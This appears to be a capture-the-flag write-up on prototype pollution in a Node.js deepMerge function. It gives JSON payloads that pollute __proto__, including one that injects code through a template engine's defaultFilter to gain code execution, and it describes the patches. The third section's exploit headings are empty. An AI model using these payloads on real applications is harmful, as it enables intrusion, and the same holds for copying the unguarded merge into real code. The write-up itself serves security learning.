# Solve:

## babyproto1:

### Where is the vulnerability and why it occurs

The problematic code is the deep merge function:
```javascript
function deepMerge(target, source) {
    let output = Object.assign({}, target);
    if (isObject(target) && isObject(source)) {
        for (let key in source){
            if(source.hasOwnProperty(key)){
                if(isObject(source[key])){
                    deepMerge(target[key], source[key])
                }else{
                    target[key] = source[key]
                }
            }
        }
    }
    return output;
}
```
In this function, it uses `target[key] = source[key]` to assign the value of `source[key]` to `target[key]`. 
However, if the target is something like `__proto__`, then it will pollute all objects.

### How to exploit the vulnerability and retrieve the flag

- To trigger the vulnerability, we can input the following into the input boxes,
where locationID is `__proto__`, and the custom key is `flag`, and the custom value is `polluted`.
This would create the data package looking like  (`1` are just placeholders)::
```json
{
    "__proto__": {
        "name": "1",
        "AQ": "1",
        "latitude": "1",
        "longitude": "1",
        "flag": "polluted"
    }
}
```
- To retrieve the flag, simply append `/flag` to the url.

### How the .patch file works

The patch works by adding a check to the `deepMerge` function to prevent prototype pollution.
```javascript
if (key === "__proto__" || key === "constructor" || key === "prototype") {continue;}
```
The check is done by checking keywords like `__proto__` or `constructor` or `prototype`,
and will skip the current iteration of the loop to prevent the pollution.

## toddlerproto2:

### Where is the vulnerability and why it occurs

The problematic code is the deep merge function:
```javascript
function deepMerge(target, source) {
    let output = Object.assign({}, target);
    if (isObject(target) && isObject(source)) {
        for (let key in source){
            if(source.hasOwnProperty(key)){
                if(isObject(source[key])){
                    deepMerge(target[key], source[key])
                }else{
                    target[key] = source[key]
                }
            }
        }
    }
    return output;
}
```
In this function, it uses `target[key] = source[key]` to assign the value of `source[key]` to `target[key]`.
However, if the target is something like `__proto__`, then it will pollute all objects.
The template engine will be polluted, and if we attatch some code to the template engine,
we can execute arbitrary code as it is rendered.

### How to exploit the vulnerability and retrieve the flag

- To trigger the vulnerability, we can input malicious code into the input boxes
that would create the data package looking like this (`1` are just placeholders):
```json
{
    "__proto__": {
        "name": "1",
        "AQ": "1",
        "latitude": "1",
        "longitude": "1",
        "defaultFilter": "e')); process.report.writeReport('touch.txt');//"
    }
}
```
- We then rerender the page
- To retrieve the flag, simply append `/flag` to the url.

### How the .patch file works

The patch uses `Object.freeze(Object.prototype)` at the beginning of the app
to prevent prototype pollution.

## my-sis-system:

### Where is the vulnerability and why it occurs

### How to exploit the vulnerability and retrieve the flag

### How the .patch file works

The patch uses `Object.freeze(Object.prototype)` at the beginning of the app
to prevent prototype pollution.


